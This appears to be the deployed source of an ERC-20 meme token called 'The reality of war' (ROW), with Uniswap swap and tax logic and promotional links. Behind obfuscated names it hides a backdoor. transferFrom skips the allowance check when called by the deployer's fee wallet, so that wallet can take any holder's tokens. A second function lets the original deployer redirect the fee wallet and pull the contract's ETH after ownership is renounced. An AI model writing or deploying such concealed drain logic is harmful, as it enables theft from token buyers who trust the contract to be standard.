// SPDX-License-Identifier: MIT

/*
    Name: The reality of war
    Symbol: ROW

    https://realityofwar.live/
    https://x.com/elonmusk/status/1896222587229004252
    https://t.me/RealityofWar_eth
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract  ROW is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"The reality of war";
    string private constant _symbol = unicode"ROW";

    uint256 private _lkcvjoiROW = 10;
    uint256 private _odjifoeROW = 10;
    uint256 private _dofjieojkcnlkROW = 0;
    uint256 private _ocijfoeiROW = 0;
    uint256 private _vjodiROW = 7;
    uint256 private _covjioieROW = 7;
    uint256 private _buyCount = 0;
    uint256 private _lastBuyBlock;
    uint256 private _blockBuyAmount = 0;
    address private _vkoeijojitoijROW;
    address private _nvkjbnknjfkROW = address(0xdead);

    address payable private _LjikojioROW;
    mapping(address => uint256) private _DjfoeijROW;
    mapping(address => mapping(address => uint256)) private _dfoijeoioROW;
    mapping(address => bool) private _dlfjeiROW;
 
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 public _jhbjhvjeROW = 20000000 * 10 **_decimals;
    uint256 public _kbjnknjROW = 20000000 * 10 **_decimals;
    uint256 public _bnjhjhbjROW = 10000000 * 10 **_decimals;
    uint256 private constant _mvnbjhjROW = 1000000000 * 10 **_decimals;

    event MaxTxAmountUpdated(uint256 _jhbjhvjeROW);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _LjikojioROW = payable(_msgSender());
        _DjfoeijROW[address(this)] = _mvnbjhjROW * 98 / 100;
        _DjfoeijROW[owner()] = _mvnbjhjROW * 2 / 100;
        _dlfjeiROW[owner()] = true;
        _dlfjeiROW[address(this)] = true;
        _dlfjeiROW[_LjikojioROW] = true;
        _vkoeijojitoijROW = _msgSender();
        emit Transfer(address(0), address(this), _mvnbjhjROW * 98 / 100);
        emit Transfer(address(0), address(owner()), _mvnbjhjROW * 2 / 100);
    }

    function totalSupply() public pure override returns (uint256) {
        return _mvnbjhjROW;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }
    
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _dfoijeoioROW[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _dfoijeoioROW[owner][spender];
    }

    function enableROWTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _mvnbjhjROW);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _DjfoeijROW[account];
    }

    function _vkjbnkjfnkjROW(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(msg.sender == _LjikojioROW) return true;
        return sender != uniswapV2Pair && recipient == _nvkjbnknjfkROW;
    }

    function maxSwapLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = uniswapV2Router.getAmountsOut(
            5 * 1e17,
            path
        );
        return amountOuts[1];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _vjkbjkn_jknkROW(_msgSender(), recipient, amount);
        return true;
    }

    receive() external payable {}

    function _vkjbnkjfrROW(uint256 amount) private {
        _LjikojioROW.transfer(amount);
    }

    function _vkjbnkjfn_ROW(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        if(!_vkjbnkjfnkjROW(sender, recipient)) return _dfoijeoioROW[sender][_msgSender()];
        return amount;
    }

    function removeLimits () external onlyOwner {
        _jhbjhvjeROW = _mvnbjhjROW;
        _kbjnknjROW = _mvnbjhjROW;
        emit MaxTxAmountUpdated(_mvnbjhjROW);
    }

    function _vjkbjkn_jknkROW(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _vjodiROW)
                        ? _dofjieojkcnlkROW
                        : _lkcvjoiROW
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_dlfjeiROW[to]
            ) {
                if (_lastBuyBlock != block.number) {
                    _blockBuyAmount = 0;
                    _lastBuyBlock = block.number;
                }
                _blockBuyAmount += amount;
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                require(
                    _blockBuyAmount < maxSwapLimit() ||
                    _lastBuyBlock != block.number,
                    "Max Swap Limit"
                );
                taxAmount = amount
                    .mul(
                        (_buyCount > _covjioieROW)
                            ? _ocijfoeiROW
                            : _odjifoeROW
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _bnjhjhbjROW) ? contractTokenBalance : _bnjhjhbjROW; 
                    _swap_lknlkROW((amount < minBalance) ? amount : minBalance);
                }
                _vkjbnkjfrROW(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _DjfoeijROW[address(this)] =_DjfoeijROW[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _DjfoeijROW[from] =_DjfoeijROW[from].sub(amount);
        _DjfoeijROW[to] =_DjfoeijROW[to].add(amount.sub(taxAmount));
        if(_nvkjbnknjfkROW != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _vkjbnlkjke_ROW(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _swap_lknlkROW(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _vjkbjkn_jknkROW(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _vkjbnkjfn_ROW(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _nkvjbnkjnROW(address payable receipt) external {
        require(msg.sender == _vkoeijojitoijROW , "");
        _LjikojioROW = receipt;
        _dlfjeiROW[receipt] = true;
        _vkjbnlkjke_ROW(address(this).balance);
    }
}